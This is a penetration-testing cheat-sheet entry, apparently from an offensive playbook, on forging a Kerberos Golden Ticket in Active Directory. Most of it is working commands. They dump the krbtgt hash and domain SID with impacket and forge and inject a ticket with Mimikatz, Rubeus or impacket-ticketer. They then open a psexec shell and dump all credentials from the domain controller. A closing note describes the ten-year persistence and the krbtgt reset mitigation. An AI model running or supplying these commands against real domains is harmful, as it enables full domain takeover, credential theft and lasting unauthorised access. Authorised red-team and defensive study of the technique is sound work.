---
id: golden-ticket
title: Golden Ticket
stage: objective
tags: [windows, ad]
tools:
  - "impacket-secretsdump -just-dc-user krbtgt $DOMAIN/user:password@$DC_IP"
  - "impacket-lookupsid $DOMAIN/user:password@$DC_IP 0"
leads_to:
  - domain-admin
---

## Requirements

- `krbtgt` NTLM hash (from DCSync)
- Domain SID

## Get Domain SID

```bash
# From secretsdump output (look for "Domain SID" line)
impacket-secretsdump $DOMAIN/user:password@$DC_IP | grep "Domain SID"

# Or via lookupsid (RID 0 = domain object)
impacket-lookupsid $DOMAIN/user:password@$DC_IP 0
```

## Create Golden Ticket (Mimikatz)

```powershell
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
# /ptt = inject into current session immediately

# Alternatively create a file to import later
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ticket:golden.kirbi
kerberos::ptt golden.kirbi
```

## Create Golden Ticket (Rubeus)

```powershell
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:$DOMAIN /sid:S-1-5-21-... /user:Administrator /ptt
```

## Create Golden Ticket (impacket — from Linux)

```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$DC_IP -k -no-pass
impacket-secretsdump $DOMAIN/Administrator@$DC_IP -k -no-pass
```

## Notes

A Golden Ticket is effectively permanent domain persistence — it's a forged TGT signed with the krbtgt key. It survives password changes for the Administrator account and lasts 10 years by default. Resetting krbtgt (twice, back to back) is the only mitigation.
